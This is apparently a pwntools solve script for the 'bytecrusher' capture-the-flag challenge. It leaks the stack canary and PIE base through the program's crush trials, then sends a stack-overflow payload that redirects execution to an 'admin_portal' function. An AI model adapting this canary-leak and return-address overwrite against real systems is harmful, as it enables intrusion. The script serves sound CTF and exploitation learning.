#!/usr/bin/env python3
from pwn import *


context.binary = elf = ELF("./bytecrusher", checksec=False)
context.log_level = "info"

HOST = args.HOST or "bytecrusher.chals.dicec.tf"
PORT = int(args.PORT or 1337)

CANARY_RATES = list(range(73, 80))
RIP_RATES = list(range(88, 94))
LEAK_RATES = CANARY_RATES + RIP_RATES
FREE_TRIALS = 16
FREE_TRIAL_RET = 0x15EC


def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(elf.path, stdin=PIPE, stdout=PIPE, stderr=PIPE)


def do_trial(io, rate, output_len=3):
    io.sendlineafter(b"Enter a string to crush:\n", b"A")
    io.sendlineafter(b"Enter crush rate:\n", str(rate).encode())
    io.sendlineafter(b"Enter output length:\n", str(output_len).encode())
    io.recvuntil(b"Crushed string:\n")
    return io.recvuntil(b"\n", drop=False)


def leak_state(io):
    leaks = {}
    for idx in range(FREE_TRIALS):
        if idx < len(LEAK_RATES):
            rate = LEAK_RATES[idx]
            line = do_trial(io, rate, 3)
            leaks[rate] = line[1:2]
        else:
            do_trial(io, 1, 2)

    canary = u64(b"\x00" + b"".join(leaks[rate] for rate in CANARY_RATES))
    saved_rip = u64(b"".join(leaks[rate] for rate in RIP_RATES) + b"\x00\x00")
    pie_base = saved_rip - FREE_TRIAL_RET
    return canary, pie_base


def main():
    io = start()
    canary, pie_base = leak_state(io)
    admin_portal = pie_base + elf.sym.admin_portal

    log.info("canary = %#x", canary)
    log.info("pie base = %#x", pie_base)
    log.info("admin_portal = %#x", admin_portal)

    payload = flat(
        b"B" * 24,
        canary,
        b"C" * 8,
        admin_portal,
    )

    io.sendlineafter(b"Enter some text:\n", payload)
    data = io.recvall(timeout=2)
    print(data.decode("latin1", "replace"), end="")


if __name__ == "__main__":
    main()
